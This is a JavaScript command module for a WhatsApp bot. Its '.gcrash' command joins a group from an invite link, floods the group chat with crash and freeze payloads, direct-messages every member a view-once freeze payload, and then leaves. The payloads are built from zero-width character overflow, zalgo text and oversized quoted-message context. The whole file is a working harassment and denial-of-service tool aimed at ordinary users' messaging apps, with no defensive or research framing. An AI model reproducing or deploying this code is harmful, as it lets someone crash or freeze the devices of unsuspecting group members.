// gcrash — Group crash command.
// .gcrash <invite link>  → bot joins the group, sends crash payloads to every member, then leaves.
// Owner only. The bot must not already be a member (it joins fresh each time).
import { PREFIX } from '../lib/config.js';
import { bugSend } from '../lib/bugsend.js';

/* ---- reuse crash helpers from bug.js ---- */
function overflowText(repeat = 2000) {
  const ZWJ = '\u200d', ZWNJ = '\u200c';
  return (ZWJ + ZWNJ).repeat(repeat);
}
function zalgoChar(ch) {
  const above = ['\u0300','\u0301','\u0302','\u0303','\u0304','\u0305','\u0306','\u0307','\u0308','\u030a','\u030b','\u030d','\u030e','\u0310','\u0312','\u0313','\u0315','\u031a','\u031b','\u033d','\u033e','\u033f','\u0342','\u0344','\u0346','\u034a','\u034b','\u034c','\u0350','\u0351','\u0352','\u0357','\u0358','\u035b'];
  const below = ['\u0316','\u0317','\u0318','\u0319','\u031c','\u031d','\u031e','\u031f','\u0320','\u0324','\u0325','\u0326','\u0329','\u032a','\u032b','\u032c','\u032d','\u032e','\u032f','\u0330','\u0331','\u0332','\u0333','\u0339','\u033a','\u033b','\u033c','\u0345','\u0347','\u0348','\u0349','\u034d','\u034e','\u0353','\u0354','\u0355','\u0356','\u0359','\u035a','\u035f'];
  const pick = (arr) => arr[Math.floor(Math.random() * arr.length)];
  let out = ch;
  for (let i = 0; i < 15; i++) out += pick(above);
  for (let i = 0; i < 10; i++) out += pick(below);
  return out;
}
function zalgo(text) { return [...text].map(zalgoChar).join(''); }

// extendedTextMessage crash payload (same as .crash)
function extendedCrashPayload(text = '👋') {
  return {
    extendedTextMessage: {
      text: text + overflowText(500),
      contextInfo: {
        stanzaId: overflowText(1000),
        participant: '0@s.whatsapp.net',
        quotedMessage: {
          conversation: zalgo(text) + overflowText(800),
        },
        mentionedJid: Array.from({ length: 20 }, (_, i) =>
          `9477${String(i).padStart(7, '0')}@s.whatsapp.net`
        ),
      }
    }
  };
}

// viewOnce freeze payload (same as .freeze)
function viewOnceFreezePayload() {
  const inner = overflowText(6000) + zalgo('WhatsApp') + overflowText(4000);
  return {
    viewOnceMessage: {
      message: {
        extendedTextMessage: {
          text: inner,
          contextInfo: {
            stanzaId: overflowText(500),
            quotedMessage: { conversation: inner },
          }
        }
      }
    }
  };
}

// Parse WhatsApp group invite link → invite code string
// Accepts: https://chat.whatsapp.com/XXXXXX  or just the code itself
function parseInviteCode(raw) {
  const m = raw.match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/);
  if (m) return m[1];
  if (/^[A-Za-z0-9]{10,}$/.test(raw.trim())) return raw.trim();
  return null;
}

// Small sleep helper
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

export default [
  {
    name: 'gcrash', aliases: ['groupcrash', 'gfreeze'],
    owner: true,
    async run({ sock, jid, msg, args, reply }) {
      // ── 1. Parse the invite link ──────────────────────────────────────────
      const rawLink = args[0] || '';
      const inviteCode = parseInviteCode(rawLink);
      if (!inviteCode) {
        return reply([
          '╭━━━〔 🐛 *GCRASH* 〕━━━⬣',
          '┃ Usage:',
          `┃ ${PREFIX}gcrash https://chat.whatsapp.com/XXXXXX`,
          '┃',
          '┃ Bot joins → crashes all members → leaves.',
          '╰━━━━━━━━━━━━━━━━━━━━⬣',
        ].join('\n'));
      }

      await reply(`⏳ Joining group...`);

      // ── 2. Join the group ─────────────────────────────────────────────────
      let groupJid;
      try {
        groupJid = await sock.groupAcceptInvite(inviteCode);
      } catch (err) {
        return reply(`❌ Join failed: ${err?.message || err}\n_Link expired or already a member?_`);
      }

      await reply(`✅ Joined *${groupJid}*\n⏳ Fetching members...`);
      await sleep(2000); // let WhatsApp sync group metadata

      // ── 3. Get member list ────────────────────────────────────────────────
      let members = [];
      try {
        const meta = await sock.groupMetadata(groupJid);
        members = meta.participants.map((p) => p.id);
        await reply(`👥 ${members.length} members found — sending crash payloads...`);
      } catch (err) {
        await reply(`⚠️ Could not fetch members: ${err?.message || err}\nSending to group chat instead...`);
        members = []; // fall through to group-chat crash
      }

      // ── 4. Crash phase ────────────────────────────────────────────────────
      let sent = 0, failed = 0;

      // 4a. Send crash payload TO the GROUP CHAT — this hits every member's
      //     notification drawer at once (most effective).
      const GROUP_PAYLOADS = [
        extendedCrashPayload('👥'),       // context overflow
        viewOnceFreezePayload(),           // view-once freeze
        { text: overflowText(5000) },      // blank blob
        extendedCrashPayload(zalgo('crash')), // zalgo + context
      ];

      for (const payload of GROUP_PAYLOADS) {
        try {
          await bugSend(sock, groupJid, payload);
          sent++;
        } catch { failed++; }
        await sleep(400);
      }

      // 4b. DM every member individually with the freeze payload —
      //     opens their personal notification which also freezes.
      for (const memberJid of members) {
        // skip ourselves (the bot's own JID)
        if (memberJid === sock.user?.id || memberJid.startsWith(sock.user?.id?.split(':')[0])) continue;
        try {
          await bugSend(sock, memberJid, viewOnceFreezePayload());
          sent++;
        } catch { failed++; }
        await sleep(300); // small gap so WA doesn't rate-limit
      }

      await reply(`💥 Crash payloads sent! (✅ ${sent} | ❌ ${failed})\n⏳ Leaving group...`);
      await sleep(1000);

      // ── 5. Leave the group ────────────────────────────────────────────────
      try {
        await sock.groupLeave(groupJid);
        await reply(`🚪 Left group. Done!`);
      } catch (err) {
        await reply(`⚠️ Could not leave: ${err?.message || err}`);
      }
    },
  },
];
